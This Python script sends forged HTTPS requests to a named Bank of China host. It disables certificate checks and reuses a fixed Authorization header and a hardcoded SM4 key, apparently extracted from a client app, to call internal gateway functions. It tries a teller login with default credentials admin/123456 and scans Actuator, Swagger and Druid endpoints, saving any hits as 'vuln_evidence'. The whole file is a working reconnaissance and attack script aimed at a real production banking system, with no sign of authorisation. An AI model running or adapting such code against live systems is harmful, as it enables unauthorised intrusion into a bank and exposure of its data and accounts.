#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""用Python ssl/socket直接测试连接"""
import ssl, socket, json, time

HOST = "dl.brcloud.bankofchina.com"
IP = "116.136.33.229"
PORT = 443

# 测试1: 直接socket+SSL连接
print("=== 测试1: Python ssl/socket直接连接 ===")
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    start = time.time()
    sock = socket.create_connection((IP, PORT), timeout=15)
    ssock = ctx.wrap_socket(sock, server_hostname=HOST)
    
    # 发送HTTP请求
    body = json.dumps({"Header":{"TranCode":"SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest","ServiceName":"queryMenuTreeBySysIdRoleIdWithGuest","ServiceCode":"D20190130","BranchId":"800000","LegalRepCode":"10000","TranDate":"20260716","TranTime":"004500000","CurrentPageNum":1,"PageTotalNum":10,"AuthFlag":"0","Channel":"39","ConsumerId":"1","SourceSysId":"1111","TerminalCode":"1121","AuthrTellerNo":"1","GlobalSeq":"1","TranSeq":"1","KeyId":"1","Mac":"1","LocalLang":"1","TranTellerNo":"1","TranTeller":"","GlobalSeqNo":"1","TranSeqNo":"1","ExtendContent":"1","TotalNum":"0","NoRetCode":True}})
    
    req = f"POST /dlydjd/sgp/transferRequest HTTP/1.1\r\nHost: {HOST}\r\nContent-Type: application/json\r\nAuthorization: 987654321\r\nContent-Length: {len(body)}\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)\r\nConnection: close\r\n\r\n{body}"
    
    ssock.sendall(req.encode('utf-8'))
    
    # 接收响应
    resp = b""
    while True:
        data = ssock.recv(4096)
        if not data:
            break
        resp += data
    
    duration = round(time.time() - start, 2)
    resp_str = resp.decode('utf-8', errors='replace')
    
    print(f"  连接成功! Time: {duration}s")
    print(f"  响应长度: {len(resp_str)}")
    
    # 分离header和body
    if "\r\n\r\n" in resp_str:
        resp_header, resp_body = resp_str.split("\r\n\r\n", 1)
        print(f"  HTTP头: {resp_header[:200]}")
        print(f"  响应体: {resp_body[:500]}")
        
        # 尝试解析JSON
        try:
            j = json.loads(resp_body)
            ret_code = j.get("Header", {}).get("RetCode", "")
            ret_msg = j.get("Header", {}).get("RetMsg", "")
            print(f"  RetCode: {ret_code} | RetMsg: {ret_msg}")
            
            if ret_code == "000000":
                print(f"  >>> SUCCESS!")
                print(f"  {json.dumps(j, ensure_ascii=False, indent=2)[:1000]}")
                
                # 保存响应
                with open(r"e:\BaiduNetdiskDownload\1\vuln_evidence\enc_socket_test.json", 'w', encoding='utf-8') as f:
                    json.dump(j, f, ensure_ascii=False, indent=2)
        except:
            pass
    
    ssock.close()
    sock.close()
except Exception as e:
    duration = round(time.time() - start, 2) if 'start' in locals() else 0
    print(f"  连接失败 ({duration}s): {e}")

# 测试2: 测试不同的API端点
print("\n=== 测试2: 测试关键API端点 ===")

def send_api_request(path, body_dict, desc):
    try:
        start = time.time()
        sock = socket.create_connection((IP, PORT), timeout=15)
        ssock = ctx.wrap_socket(sock, server_hostname=HOST)
        
        body = json.dumps(body_dict)
        req = f"POST /dlydjd/{path} HTTP/1.1\r\nHost: {HOST}\r\nContent-Type: application/json\r\nAuthorization: 987654321\r\nContent-Length: {len(body)}\r\nUser-Agent: Mozilla/5.0 (iPhone)\r\nConnection: close\r\n\r\n{body}"
        
        ssock.sendall(req.encode('utf-8'))
        
        resp = b""
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            resp += data
        
        duration = round(time.time() - start, 2)
        resp_str = resp.decode('utf-8', errors='replace')
        
        if "\r\n\r\n" in resp_str:
            _, resp_body = resp_str.split("\r\n\r\n", 1)
            try:
                j = json.loads(resp_body)
                ret_code = j.get("Header", {}).get("RetCode", "")
                ret_msg = j.get("Header", {}).get("RetMsg", "")
                print(f"  [{desc}] RetCode={ret_code} RetMsg={ret_msg} | {duration}s")
                
                if ret_code == "000000":
                    print(f"    >>> SUCCESS!")
                    print(f"    {json.dumps(j, ensure_ascii=False)[:600]}")
                    return j
            except:
                if len(resp_body) > 10:
                    print(f"  [{desc}] 非JSON响应: {resp_body[:200]}")
                else:
                    print(f"  [{desc}] 空响应 | {duration}s")
        else:
            print(f"  [{desc}] 无响应头分隔 | {duration}s | {resp_str[:200]}")
        
        ssock.close()
        sock.close()
    except Exception as e:
        duration = round(time.time() - start, 2) if 'start' in locals() else 0
        print(f"  [{desc}] 错误 ({duration}s): {e}")
    
    time.sleep(0.5)
    return None

def make_header(tran_code, service_name):
    return {
        "CurrentPageNum": 1, "PageTotalNum": 10, "NoRetCode": True,
        "BranchId": "800000", "LegalRepCode": "10000", "TranTeller": "",
        "TranCode": tran_code, "TranDate": "20260716", "TranTime": "004500000",
        "ServiceName": service_name, "ServiceCode": "D20190130",
        "AuthFlag": "0", "AuthrTellerNo": "1", "Channel": "39",
        "ConsumerId": "1", "GlobalSeq": "1", "GlobalSeqNo": "1",
        "KeyId": "1", "LocalLang": "1", "Mac": "1", "SourceSysId": "1111",
        "TerminalCode": "1121", "TranSeq": "1", "TranSeqNo": "1",
        "TranTellerNo": "1", "ExtendContent": "1", "TotalNum": "0"
    }

# 测试 isApiUseEncryptionList
h = make_header("CUST-INFO/isApiUseEncryptionList", "isApiUseEncryptionList")
send_api_request("gateway/admin/isApiUseEncryptionList", {"Header": h}, "isApiUseEncryptionList-gw")
send_api_request("sgp/transferRequest", {"Header": h}, "isApiUseEncryptionList-sgp")

# 测试 buildNonceToken
from gmssl import sm4 as sm4_mod
import binascii

def sm4_encrypt(data_str, key_hex="714b674e6c796245574d48652b39773d"):
    key = binascii.unhexlify(key_hex)
    crypt = sm4_mod.CryptSM4()
    crypt.set_key(key, sm4_mod.SM4_ENCRYPT)
    return crypt.crypt_ecb(data_str.encode('utf-8')).hex()

import random
num1 = 7 * random.randint(500, 999)
num2 = 13 * random.randint(500, 799)
plain = f"{num1}_{num2}"
enc = sm4_encrypt(plain)
print(f"\n  K_E = 714b674e6c796245574d48652b39773d")
print(f"  明文 = {plain} | SM4加密 = {enc}")

h2 = make_header("CUST-INFO/buildNonceToken", "buildNonceToken")
send_api_request("gateway/admin/buildNonceToken", {"Header": h2, "data": enc}, "buildNonceToken-gw")
send_api_request("sgp/transferRequest", {"Header": h2, "data": enc}, "buildNonceToken-sgp")

# 测试 initUserKeyGroup
mode_type = sm4_encrypt("modp1")
app_id = sm4_encrypt("sfs01003001303031")
nonce_val = f"s{int(time.time()*1000)}{random.randint(100000, 999999)}"
open_id = sm4_encrypt(nonce_val)

h3 = make_header("CUST-INFO/initUserKeyGroup", "initUserKeyGroup")
send_api_request("gateway/admin/initUserKeyGroup", {
    "Header": h3, "negotiateValue": "", "modeType": mode_type, "appId": app_id, "openId": open_id
}, "initUserKeyGroup-gw")
send_api_request("sgp/transferRequest", {
    "Header": h3, "negotiateValue": "", "modeType": mode_type, "appId": app_id, "openId": open_id
}, "initUserKeyGroup-sgp")

# 测试 sgpTellerLogin
h4 = make_header("test-Login", "sgpTellerLogin")
send_api_request("sgp/sgpTellerLogin.auth", {"Header": h4}, "sgpTellerLogin")
send_api_request("sgp/sgpTellerLogin.auth", {"Header": h4, "tellerId": "admin", "password": "123456"}, "sgpTellerLogin-creds")

# 测试 sgpTellerLogout
h5 = make_header("test-Logout", "sgpTellerLogout")
send_api_request("sgp/sgpTellerLogout.auth", {"Header": h5}, "sgpTellerLogout")

# 测试 queryVerificationCode
h6 = make_header("test-queryVerificationCode", "queryVerificationCode")
send_api_request("sgp/queryVerificationCode.auth", {"Header": h6}, "queryVerificationCode")

# 测试Actuator端点
print("\n=== 测试3: Actuator端点 ===")
def send_get_request(path, desc):
    try:
        start = time.time()
        sock = socket.create_connection((IP, PORT), timeout=10)
        ssock = ctx.wrap_socket(sock, server_hostname=HOST)
        
        req = f"GET /dlydjd/{path} HTTP/1.1\r\nHost: {HOST}\r\nAuthorization: 987654321\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
        ssock.sendall(req.encode('utf-8'))
        
        resp = b""
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            resp += data
        
        duration = round(time.time() - start, 2)
        resp_str = resp.decode('utf-8', errors='replace')
        
        if "HTTP/1.1 200" in resp_str or "HTTP/1.0 200" in resp_str:
            print(f"  [FOUND] /{path} => HTTP 200 | {duration}s")
            if "\r\n\r\n" in resp_str:
                _, body = resp_str.split("\r\n\r\n", 1)
                print(f"    {body[:300]}")
        elif "HTTP/1.1 404" in resp_str or "HTTP/1.0 404" in resp_str:
            pass  # 忽略404
        else:
            status = ""
            if "HTTP/1.1 " in resp_str:
                status = resp_str.split("HTTP/1.1 ")[1].split("\r\n")[0]
            elif "HTTP/1.0 " in resp_str:
                status = resp_str.split("HTTP/1.0 ")[1].split("\r\n")[0]
            if status and status[0] != "4":
                print(f"  [HTTP {status}] /{path} | {duration}s")
        
        ssock.close()
        sock.close()
    except Exception as e:
        pass
    time.sleep(0.2)

for p in ["actuator", "actuator/health", "actuator/env", "actuator/beans", 
          "actuator/mappings", "swagger-ui.html", "v2/api-docs", "druid/"]:
    send_get_request(p, p)

print("\n=== 全部测试完成 ===")
